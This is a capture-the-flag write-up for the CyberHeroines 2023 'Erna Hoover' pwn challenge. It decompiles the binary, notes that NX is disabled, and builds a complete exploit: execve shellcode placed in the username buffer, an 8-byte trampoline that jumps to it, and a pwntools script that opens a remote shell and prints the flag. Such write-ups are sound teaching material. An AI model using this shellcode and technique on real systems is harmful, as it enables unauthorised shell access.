# CyberHeroines 2023

## Erna Hoover

> [Erna Schneider Hoover](https://en.wikipedia.org/wiki/Erna_Schneider_Hoover)
> (born June 19, 1926) is an American mathematician notable for inventing a
> computerized telephone switching method which "revolutionized modern
> communication". It prevented system overloads by monitoring call center
> traffic and prioritizing tasks on phone switching systems to enable more
> robust service during peak calling times. At Bell Laboratories where she
> worked for over 32 years, Hoover was described as an important pioneer for
> women in the field of computer technology. - [Wikipedia
> Entry](https://en.wikipedia.org/wiki/Erna_Schneider_Hoover)  
>  
> Chal: Get your best shellcode going at `0.cloud.chals.io 28184` for this
> [inventor who developed the system for handling telephone traffic
> overload](https://ncwit.org/article/2023-pioneer-in-tech-award-recipient-
> erna-schneider-hoover/).  
>  
>  Author: [TJ](https://www.tjoconnor.org/)  
>  
> [`chal.bin`](https://raw.githubusercontent.com/D13David/ctf-
> writeups/main/cyberheroines23/pwn/erna_hoover/chal.bin)

Tags: _pwn_

## Solution  
We get a binary to exploit for this challenge. Lets see what's in it?

```c  
undefined8 main(void)  
{  
 size_t sVar1;  
 char local_58 [64];  
 ssize_t local_18;  
 code *local_10;  
  
 logo();  
 printf("\x1b[38;5;161m Enter Username >>> ");  
 fgets(local_58,0x32,stdin);  
 sVar1 = strcspn(local_58,"\n");  
 local_58[sVar1] = '\0';  
 printf("\x1b[38;5;161m Greetings, %s! You get 8 bytes of shellcode >>>
\n",local_58);  
 local_10 = (code *)mmap((void *)0x88880000,0x1000,7,0x32,-1,0);  
 local_18 = read(0,local_10,8);  
 (*local_10)();  
 return 0;  
}  
```

We can enter `50` bytes as a username. There is no overflow here, since the
buffer is at least `64` bytes long. After this we can enter `8` more bytes
which are then written to executable memory and run. As the comment states, we
have 8 bytes of shellcode we can use. Thats not a lot, but lets see what we
can do.

Checking the binary with `checksec` we see that basialy all security
measurements are disabled. But the best thing for us here is that stack memory
is executable. Knowing this we have a lot more space to inject shellcode as
our username. The *actual* 8 bytes of shellcode need only to jump to the
username buffer, that's doable in 8 bytes.

```bash  
$ checksec ./chal.bin  
[*] '/home/ctf/chal.bin'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX disabled  
   PIE:      No PIE (0x400000)  
   RWX:      Has RWX segments  
```

To get shell we can for instance use [`this shellcode`](https://shell-
storm.org/shellcode/files/shellcode-806.html)

```asm  
 xor eax, eax  
 mov rbx, 0xFF978CD091969DD1  
 neg rbx  
 push rbx  
 push rsp  
 pop rdi  
 cdq  
 push rdx  
 push rdi  
 push rsp  
 pop rsi  
 mov al, 0x3b  
 syscall  
```

Having this on the stack we only need to know where to jump to. When
inspecting with `Ghidra` or `gdb` we see the buffer is `120` bytes from `rsp`
when the trampoline shellcode is executed (before the call `buffer address -
rsp = 112` bytes plus 8 bytes return address for the call to our shellcode).
So we can use `rsp` as reference to jump to our buffer.

```  
 add rsp, 120  
 jmp rsp  
```

The full exploit then looks something like this:

```  
from pwn import *

#context.log_level = "DEBUG"  
context.arch = "amd64"

#p = process("./chal.bin")  
p = remote("0.cloud.chals.io", 28184)

payload1 = asm('''  
   xor eax, eax  
   mov rbx, 0xFF978CD091969DD1  
   neg rbx  
   push rbx  
   push rsp  
   pop rdi  
   cdq  
   push rdx  
   push rdi  
   push rsp  
   pop rsi  
   mov al, 0x3b  
   syscall  
''')

payload2 = asm('''  
       add rsp, 120  
       jmp rsp  
''')

p.sendline(payload1)  
p.sendlineafter(b"shellcode >>> \n", payload2)  
p.interactive()  
```

Running this gives us shell on the remote machine and we can just cat the
flag.

```bash  
$ python solve.py  
[+] Opening connection to 0.cloud.chals.io on port 28184: Done  
[*] Switching to interactive mode  
$ ls  
-  
banner_fail  
bin  
boot  
chal  
dev  
etc  
flag.txt  
home  
lib  
lib32  
lib64  
libx32  
media  
mnt  
opt  
proc  
pwndbg  
root  
run  
sbin  
service.conf  
srv  
sys  
tmp  
usr  
var  
wrapper  
$ cat flag.txt  
chctf{r3volutioniz3d_moD3rn_coMMunicat10ns}$  
```

Flag `chctf{r3volutioniz3d_moD3rn_coMMunicat10ns}`

Original writeup (https://github.com/D13David/ctf-
writeups/blob/main/cyberheroines23/pwn/erna_hoover/README.md).